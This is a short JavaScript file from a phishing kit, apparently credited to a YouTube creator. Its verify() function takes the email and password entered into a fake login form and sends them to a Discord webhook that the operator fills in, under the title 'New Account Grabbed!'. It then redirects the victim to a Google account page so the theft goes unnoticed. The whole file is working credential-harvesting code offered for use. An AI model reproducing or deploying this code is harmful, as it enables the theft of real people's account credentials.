// This tool was created by hassamohammed
// https://youtube.com/@hassamohammed/
// https://github.com/hassamohammed/
// https://hassamohamed.github.io/
// Don't skid :)


// Discord Stuff
const webhook_url = "" // Insert Discord Webhook URL Here

function verify() {
    var request = new XMLHttpRequest();
      request.open("POST", webhook_url);

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "log-thing",
        avatar_url: "",
        "embeds": [
            {
              "type": "rich",
              "title": `❗ New Account Grabbed! ❗`,
              "description": `**Email Address:**\n*${document.getElementById("email").value}*\n**Password:**\n*${document.getElementById("password").value}*`,
              "color": 0x00ff04,
              "author": {
                "name": `hassamohammed`,
                "url": `https://www.youtube.com/@hassamohammed`
              },
              "footer": {
                "text": `Created by @hassamohammed`,
                "icon_url": `https://yt3.googleusercontent.com/9Mxgi4Jw4ND3yZemSvg_kNmqB4s8_WZsjRR5lcXKGWah3Bv-tXX9mAJK5iD8Hu5FnBOp3hrm=s176-c-k-c0x00ffffff-no-rj`
              }
            }
          ],
      }

      request.send(JSON.stringify(params));

    window.location.replace("myaccount.google.com");
}
